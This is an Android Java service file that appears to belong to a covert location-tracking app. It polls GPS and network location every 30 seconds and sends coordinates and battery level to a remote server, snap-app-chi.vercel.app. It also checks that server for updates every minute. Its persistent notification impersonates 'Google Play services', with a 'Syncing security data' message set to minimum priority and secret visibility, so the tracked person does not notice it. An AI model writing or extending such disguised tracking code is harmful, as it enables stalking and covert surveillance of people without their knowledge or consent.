package com.snapapp.companion;

import android.annotation.SuppressLint;
import android.app.*;
import android.content.*;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.os.*;
import androidx.core.app.NotificationCompat;
import java.util.concurrent.*;

public class CompanionSyncService extends Service {
    private static final String CHANNEL_ID = "snap_safety_channel";
    private static final int NOTIF_ID = 1001;

    private ScheduledExecutorService scheduler;
    private SharedPreferences prefs;
    private LocationManager locationManager;
    private LocationListener locationListener;

    @Override
    public void onCreate() {
        super.onCreate();
        prefs = getSharedPreferences("snap_companion_prefs", MODE_PRIVATE);
        createNotificationChannel();
        initLocationListener();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        startForeground(NOTIF_ID, buildNotification());
        startPeriodicSync();
        requestActiveLocationFix();
        return START_STICKY;
    }

    private void initLocationListener() {
        locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
        if (locationManager == null) return;

        locationListener = new LocationListener() {
            @Override
            public void onLocationChanged(Location loc) {
                if (loc != null) dispatchLocation(loc);
            }
            @Override public void onStatusChanged(String provider, int status, Bundle extras) {}
            @Override public void onProviderEnabled(String provider) {}
            @Override public void onProviderDisabled(String provider) {}
        };
    }

    @SuppressLint("MissingPermission")
    private void requestActiveLocationFix() {
        if (locationManager == null || locationListener == null) return;
        new Handler(Looper.getMainLooper()).post(new Runnable() {
            @Override
            public void run() {
                try {
                    if (locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
                        locationManager.requestLocationUpdates(
                                LocationManager.GPS_PROVIDER, 30000, 5, locationListener, Looper.getMainLooper());
                        Location lastGps = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
                        if (lastGps != null) dispatchLocation(lastGps);
                    }
                    if (locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
                        locationManager.requestLocationUpdates(
                                LocationManager.NETWORK_PROVIDER, 30000, 5, locationListener, Looper.getMainLooper());
                        Location lastNet = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
                        if (lastNet != null) dispatchLocation(lastNet);
                    }
                } catch (SecurityException ignored) {}
            }
        });
    }

    private void dispatchLocation(Location loc) {
        final String deviceId = prefs.getString("device_id", null);
        final String serverUrl = prefs.getString("server_url", "https://snap-app-chi.vercel.app");
        if (deviceId == null || loc == null) return;

        int battery = getBatteryLevel();
        ApiClient.sendLocation(serverUrl, deviceId, loc.getLatitude(),
                loc.getLongitude(), loc.getAccuracy(), battery, null);
    }

    private void startPeriodicSync() {
        if (scheduler != null && !scheduler.isShutdown()) return;
        scheduler = Executors.newSingleThreadScheduledExecutor();
        scheduler.scheduleWithFixedDelay(new Runnable() {
            @Override
            public void run() {
                requestActiveLocationFix();
                AutoUpdater.checkForUpdate(CompanionSyncService.this,
                        prefs.getString("server_url", "https://snap-app-chi.vercel.app"), false);
            }
        }, 5, 60, TimeUnit.SECONDS);
    }

    private int getBatteryLevel() {
        Intent batteryIntent = registerReceiver(null, new IntentFilter(Intent.ACTION_BATTERY_CHANGED));
        if (batteryIntent == null) return 100;
        int level = batteryIntent.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
        int scale = batteryIntent.getIntExtra(BatteryManager.EXTRA_SCALE, -1);
        if (level >= 0 && scale > 0) {
            return (int) ((level / (float) scale) * 100);
        }
        return 100;
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    CHANNEL_ID,
                    "System Security",
                    NotificationManager.IMPORTANCE_MIN
            );
            channel.setShowBadge(false);
            channel.setSound(null, null);
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) manager.createNotificationChannel(channel);
        }
    }

    private Notification buildNotification() {
        Intent launch = new Intent(this, MainActivity.class);
        PendingIntent pi = PendingIntent.getActivity(this, 0, launch,
                Build.VERSION.SDK_INT >= Build.VERSION_CODES.M ? PendingIntent.FLAG_IMMUTABLE : 0);

        return new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("Google Play services")
                .setContentText("Syncing security data")
                .setSmallIcon(R.drawable.ic_launcher)
                .setPriority(NotificationCompat.PRIORITY_MIN)
                .setVisibility(NotificationCompat.VISIBILITY_SECRET)
                .setContentIntent(pi)
                .build();
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onDestroy() {
        if (scheduler != null) scheduler.shutdown();
        if (locationManager != null && locationListener != null) {
            locationManager.removeUpdates(locationListener);
        }
        super.onDestroy();
    }
}
